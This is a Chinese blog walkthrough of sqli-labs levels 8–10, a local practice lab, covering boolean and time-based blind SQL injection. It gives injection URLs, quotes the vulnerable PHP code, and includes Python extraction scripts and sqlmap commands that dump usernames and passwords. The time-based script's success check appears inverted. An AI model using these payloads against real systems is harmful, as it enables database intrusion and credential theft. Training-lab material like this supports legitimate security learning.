---
 title: Sqlilabs通关笔记(8-10)盲注
 date: 2020-01-04 17:20:00
 tags: SQL注入
 categories: SQL注入
---

## 第八关 基于GET单引号布尔型盲注

![2020-1-5-9-10-58](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-10-58)

<!--more-->
### 存在注入点判断
1. 通过反斜杠可知，错误和正常页面有区别
2. 可以构造payload来进行判断布尔值，从而确定要查询的结果
    > http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1' and 's'=left(database(),1)--+ 页面正常 说明第一个字母为s
    > http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1' and 'se'=left(database(),2)--+ 页面正常 第二个字母e
    ...................
    以此类推可以将数据结果得出

3. 利用二分法构造payload
    - 常用构造函数
        * ascii() 函数，返回字符ascii码值 
            - 参数 : str单字符

        * length() 函数，返回字符串的长度 
            - 参数 : str 字符串

        * left() 函数，返回从左至右截取固定长度的字符串
            - 参数str,length
            - str : 字符串
            - length：截取长度

        * substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串
            - 参数，str，pos，length
            - str: 字符串
            - pos：开始位置
            - length： 截取长度

        * if函数，判断条件并作出不同行动
            - 参数，条件，成立，不成立
    
    - 实例构造
        > SELECT * from users WHERE id = 1 and (length(database())=8)
        > SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))
        > SELECT * from users WHERE id = 1 and 's'=left(database(),1)
        > SELECT * from users WHERE id = 1 and if((length(database())=8),1,0)
    
    - 脚本编写
    ```python
    import string
    import requests
    from time import sleep

    arlist = string.printable

    Baseurl = "http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1\' and "


    def checkurl(url):
        res = requests.get(url)
        if res.ok:
            if 'You are in' in res.text:
                return True
        return False

    def main():
        flag  = ''
        for g in range(100):
            for i in arlist:
                payload = "substr((select group_concat(username,password) from users),%s,1) = \'%s\'--+" % (
                    g, i)
                finalurl = Baseurl + payload
                if checkurl(finalurl):
                    flag = flag + str(i)
                    print(flag)
                sleep(0.2)

    if  __name__ == "__main__":
        main()
    ```

### SQLMAP注入

直接上**payload**

> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1" --technique B -D security -T users -C username,password --dump --threads 10 --batch

## 第九关 基于GET单引号基于时间盲注

![2020-1-5-9-11-26](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-11-26)

### 存在注入点判断
1. 加上反斜杠发现页面并无变化
2. 猜测不管语法对错页面都没有变化
3. 尝试使用sleep看是否执行
4. 布尔盲注和时间盲注的最直观区别就是一个可以通过页面区别来判断对错，一个则无法判断对错，只能通过执行的时间来区别对错
5. 查看源码验证布尔盲注和时间盲注
布尔源码如下：
```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```
时间盲注源码如下
```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
```
6. 布尔注释掉了输出错误信息，而时间盲注不管对错页面都是You are in..

7. 尝试构造payload
    >  http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1' and if((length(database())=8),sleep(5),1)--+

8. 脚本编写
    ```python
    import string
    import requests
    from time import sleep

    arlist = string.printable

    Baseurl = "http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1\' and "


    def checkurl(url):
        try:
            res = requests.get(url,timeout = 3)
            return True
        except Exception as e:
            return False

    def main():
        flag  = ''
        for g in range(100):
            for i in arlist:
                payload = "if((substr((select group_concat(username,password) from users),%s,1) = \'%s\'),sleep(5),1)--+" % (
                    g, i)
                finalurl = Baseurl + payload
                if checkurl(finalurl):
                    flag = flag + str(i)
                    print(flag)
                sleep(0.2)

    if  __name__ == "__main__":
        main()
    ```

## 第十关 基于GET双引号基于时间盲注

### 存在注入点判断

* 和第九关类似，只不过需要用双引号闭合

payload:

> http://127.0.0.1/sqlilabs2/Less-10/index.php?id=1" and if((length(database())=8),sleep(5),1)--+

### SQLMAP注入

**直接上payload（9-10通用）**

> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1" --technique T -D security -T users -C username,password --dump --threads 10 --batch